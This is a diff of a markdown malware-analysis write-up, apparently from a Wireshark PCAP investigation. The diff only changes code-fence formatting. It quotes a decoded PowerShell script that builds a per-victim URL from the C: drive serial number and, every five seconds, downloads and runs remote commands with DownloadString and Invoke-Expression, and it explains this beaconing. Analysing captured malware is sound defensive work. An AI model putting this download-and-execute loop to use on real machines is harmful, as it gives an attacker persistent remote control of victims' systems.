@@ -100,7 +100,7 @@ When I opened the script, I found that it does not look like code, but rather a 
 the code to extract the malicious code in found here: https://github.com/yasserhous/PCAP-Analysis-with-Wireshark/blob/Master/decoder.py
 
 The malicious code is the following:
-''' bash
+```bash
 $fso = New-Object -Com "Scripting.FileSystemObject"
 $SerialNumber = $fso.GetDrive("c:\").SerialNumber
 $SerialNumber = "{0:X}" -f $SerialNumber
@@ -120,8 +120,7 @@ while ($true) {
     Invoke-Expression $result
     Start-Sleep -s 5
 }
-
-'''
+```
 As mentioned prior, the script creates a unique URL for the infected machine "$url = $ip+$serial" , and then through an infinite loop, it attempts to contact home ( $result=$s.DownloadString($url)) every 5 seconds.
 
 
